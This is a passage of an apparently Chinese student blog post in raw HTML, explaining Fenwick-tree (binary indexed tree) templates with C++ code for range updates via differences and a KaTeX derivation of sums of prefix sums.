class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;m;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>,&amp;x1,&amp;x2,&amp;x3);</span><br><span class="line">        <span class="keyword">if</span>(x1==<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">Add</span>(x2,x3);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(x1==<span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> ret=<span class="built_in">Sum</span>(x3)-<span class="built_in">Sum</span>(x2<span class="number">-1</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ret);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="一维-区间修改单点查询"><a class="markdownIt-Anchor" href="#一维-区间修改单点查询"></a> 【一维】 区间修改，单点查询</h4>
<p>题目链接：<a href="http://10.12.162.1:5880/contest/22/problem/P0401">oj | 树状数组模板二</a></p>
<p>这里利用的是  <strong>树状数组加差分</strong>，这里只维护了一个数组，在初始化的时候计算差分，这样在修改区间<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">[</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[x,y]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">]</span></span></span></span>时，事实上更改的差分只有<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mi>r</mi><mi>r</mi><mo stretchy="false">[</mo><mi>x</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">arr[x]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathdefault">x</span><span class="mclose">]</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mi>r</mi><mi>r</mi><mo stretchy="false">[</mo><mi>y</mi><mo>+</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">arr[y+1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span></span>，反映到前缀和的维护上就是按照一的思路对前缀和进行修改即可。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ll long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">ll arr[<span class="number">500001</span>]=&#123;<span class="number">0</span>&#125;;<span class="comment">//差分数组--&gt;前缀和数组</span></span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> ll <span class="title">LowBit</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x &amp; (x^(x<span class="number">-1</span>));</span><br><span class="line">    <span class="comment">//lowbit(i)=2^k,其中k为i在二进制下末尾0的个数</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Add</span><span class="params">(ll i,ll k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (i&lt;=n)</span><br><span class="line">    &#123;</span><br><span class="line">        arr[i]+=k;</span><br><span class="line">        i+=<span class="built_in">LowBit</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">ll <span class="title">Sum</span><span class="params">(ll p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//计算前缀和</span></span><br><span class="line">    <span class="comment">//P1=x,p_i+1=P_i-LowBit(p_i)，得出前缀和</span></span><br><span class="line">    ll sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(p)</span><br><span class="line">    &#123;</span><br><span class="line">        sum+=arr[p];</span><br><span class="line">        p-=<span class="built_in">LowBit</span>(p);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> m;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">    ll x=<span class="number">0</span>,y=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;x);</span><br><span class="line">        <span class="built_in">Add</span>(i,x-y);</span><br><span class="line">        y=x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> op;</span><br><span class="line">    ll l,r,k;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;m;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;op);</span><br><span class="line">        <span class="keyword">if</span>(op==<span class="number">1</span>)<span class="comment">//修改数组</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%lld %lld %lld&quot;</span>,&amp;l,&amp;r,&amp;k);</span><br><span class="line">            <span class="built_in">Add</span>(l,k);</span><br><span class="line">            <span class="built_in">Add</span>(r+<span class="number">1</span>,-k);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(op==<span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;k);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,<span class="built_in">Sum</span>(k));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>附上我们老师的题解：<a href="http://10.12.162.1:5881/topic/27/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84-%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84%E6%A8%A1%E6%9D%BF%E4%BA%8C-%E5%B7%AE%E5%88%86-%E5%8C%BA%E9%97%B4%E4%BF%AE%E6%94%B9-%E5%8D%95%E7%82%B9%E6%9F%A5%E8%AF%A2">树状数组：树状数组模板二，差分，区间修改，单点查询 | NodeBB</a></p>
<h4 id="xxx-前前缀和"><a class="markdownIt-Anchor" href="#xxx-前前缀和"></a> 【xxx】 前前缀和</h4>
<p>题目链接：<a href="http://10.12.162.1:5880/contest/22/problem/P0404">oj | 前缀和</a></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20211102184850.png" alt="前前缀和" /></p>
<p>注意前缀和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>S</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo>=</mo><msubsup><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>i</mi></msubsup><msub><mi>a</mi><mi>j</mi></msub><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;S[i]=\sum_{j=1}^ia_j\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.400382em;vertical-align:-0.43581800000000004em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.964564em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.43581800000000004em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>，前前缀和就是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>k</mi></msubsup><msub><mi>S</mi><mi>i</mi></msub><mo>=</mo><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>k</mi></msubsup><msubsup><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>i</mi></msubsup><msub><mi>a</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">\;\sum_{i=1}^kS_i=\sum_{i=1}^k\sum_{j=1}^ia_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2887179999999998em;vertical-align:-0.29971000000000003em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9890079999999999em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.424826em;vertical-align:-0.43581800000000004em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9890079999999999em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.964564em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.43581800000000004em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，以空间换时间将式子展开（优良传统之我不会.jpg），考虑对于元素<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><msub><mi>a</mi><mi>i</mi></msub><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;a_i\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>，其计算的次数为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>k</mi><mo>−</mo><mi>i</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mtext>  </mtext></mrow><annotation encoding="application/x-tex">(k-i+1)\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.74285em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>次，所以：</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>k</mi></munderover><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>i</mi></munderover><msub><mi>a</mi><mi>i</mi></msub><mspace linebreak="newline"></mspace><mo>=</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>k</mi></munderover><mo stretchy="false">(</mo><mi>k</mi><mo>−</mo><mi>i</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>∗</mo><msub><mi>a</mi><mi>i</mi></msub><mspace linebreak="newline"></mspace><mo>=</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>k</mi></munderover><mo stretchy="false">(</mo><mi>k</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>∗</mo><msub><mi>a</mi><mi>i</mi></msub><mo>−</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>k</mi></munderover><mi>i</mi><mo>∗</mo><msub><mi>a</mi><mi>i</mi></msub><mspace linebreak="newline"></mspace><mo>=</mo><mo stretchy="false">(</mo><mi>k</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>k</mi></munderover><msub><mi>a</mi><mi>i</mi></msub><mo>−</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>k</mi></munderover><mi>i</mi><mo>∗</mo><msub><mi>a</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">\sum_{i=1}^k\sum_{j=1}^ia_i\\=\sum_{i=1}^k(k-i+1)*a_i
\\=\sum_{i=1}^k(k+1)*a_i-\sum_{i=1}^ki*a_i\\=(k+1)\sum_{i=1}^ka_i-\sum_{i=1}^ki*a_i
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.24989em;vertical-align:-1.4137769999999998em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8361130000000003em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8116690000000006em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4137769999999998em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.1137820000000005em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8361130000000003em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.74285em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.1137820000000005em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8361130000000003em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:3.1137820000000005em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8361130000000003em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:3.1137820000000005em;vertical-align:-1.277669em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8361130000000003em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span 